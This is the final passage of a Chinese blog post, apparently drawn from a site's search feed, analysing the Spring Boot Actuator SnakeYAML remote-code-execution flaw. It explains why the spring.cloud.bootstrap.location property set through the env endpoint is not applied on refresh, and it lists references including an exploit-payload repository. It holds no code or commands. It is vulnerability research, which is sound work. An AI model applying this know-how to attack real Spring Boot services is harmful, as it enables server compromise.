<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003947014.png" alt="image-20210820003947014"></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003942919.png" alt="image-20210820003942919">    </p>
<p>由于我们通过post env端点设置的spring.cloud.bootstrap.location属性值存放在name为manager中，所以这里并不会执行capturedPropertySources.addLast操作，也就无法添加到environment中，从而导致spring.cloud.bootstrap.location属性值在refresh时并未设置并刷新：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820004046273.png" alt="image-20210820004046273">    </p>
<p>即上面所说的现象，org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中获取spring.cloud.bootstrap.location属性值时为空：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820004107671.png" alt="image-20210820004107671">    </p>
<blockquote>
<p>注意，这里补充下，根据“Actuator env说明”部分可知，refresh是在spring-cloud-context中扩展的，所以此问题重点是spring-cloud-context的变更导致，即上方org.springframework.cloud.context.refresh.ContextRefresher#copyEnvironment函数的不同。</p>
</blockquote>
<h1 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a>巨人的肩膀</h1><ul>
<li><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">exploiting-spring-boot-actuators</a></li>
<li><a href="https://github.com/artsploit/yaml-payload">yaml-payload</a></li>
<li><a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note">exploit-spring-boot-actuator-spring-cloud-env-note</a></li>
<li>……</li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>Java Sec</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>actuator</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
</search>
